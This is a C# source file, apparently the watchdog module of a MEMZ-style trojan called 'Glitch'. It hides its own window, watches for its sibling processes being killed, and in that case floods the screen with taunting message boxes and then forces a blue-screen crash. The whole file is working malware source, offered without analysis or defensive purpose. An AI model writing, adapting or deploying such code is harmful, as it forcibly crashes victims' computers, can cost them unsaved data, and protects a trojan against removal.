using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using CC_Functions.W32;
using GlitchPayloads;

namespace Glitch
{
    public static class WatchDog
    {
        public const int WDC = 5;
        public static readonly string KillMessages = @"YOU KILLED MY TROJAN!\nNow you are going to die.
REST IN PISS, FOREVER MISS.
I WARNED YOU...
HAHA N00B L2P G3T R3KT
You failed at your 1337 h4x0r skillz.
YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STILL FUCKED!
HACKER!\nENJOY BAN!
GET BETTER HAX NEXT TIME xD
HAVE FUN TRYING TO RESTORE YOUR DATA :D
|\/|3|\/|2
BSOD INCOMING
VIRUS PRANK (GONE WRONG)
ENJOY THE NYAN CAT
Get dank antivirus m9!
You are an idiot!\nHA HA HA HA HA HA HA
#MakeMalwareGreatAgain
SOMEBODY ONCE TOLD ME THE MEMZ ARE GONNA ROLL ME
Why did you even tried to kill MEMZ?\nYour PC is fucked anyway.
SecureBoot sucks.
gr8 m8 i r8 8/8
Have you tried turning it off and on again?
<Insert Joel quote here>
Well, hello there. I don't believe we've been properly introduced. I'm Bonzi!
'This is everything I want in my computer'\n - danooct1 2016
'Uh, Club Penguin. Time to get banned!'\n - danooct1 2016";

        public static readonly string[] KillMessagesArr =
            KillMessages.Split(new[] {"\n", "\r"}, StringSplitOptions.RemoveEmptyEntries)
                .Select(s => s.Replace("\\n", Environment.NewLine)).ToArray();

        public static void Run()
        {
            Wnd32.fromHandle(Process.GetCurrentProcess().MainWindowHandle).shown = false;
            Thread.Sleep(5000);
            string modN = Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.ModuleName);
            while (true)
            {
                if (Process.GetProcessesByName(modN).Length != WDC + 1)
                {
#if DEBUG
                    Process[] p = Process.GetProcessesByName(modN);
                    for (int i = 0; i < p.Length; i++)
                    {
                        p[i].Kill();
                    }
#else
                    for (int i = 0; i < 20; i++)
                            System.Threading.Tasks.Task.Run(() => { MessageBox.Show(KillMessagesArr[Common.Rnd.Next(0, KillMessagesArr.Length)]); });
                    Thread.Sleep(4000);
                    Power.RaiseEvent(Power.ShutdownMode.BSoD);
#endif
                }
            }
        }
    }
}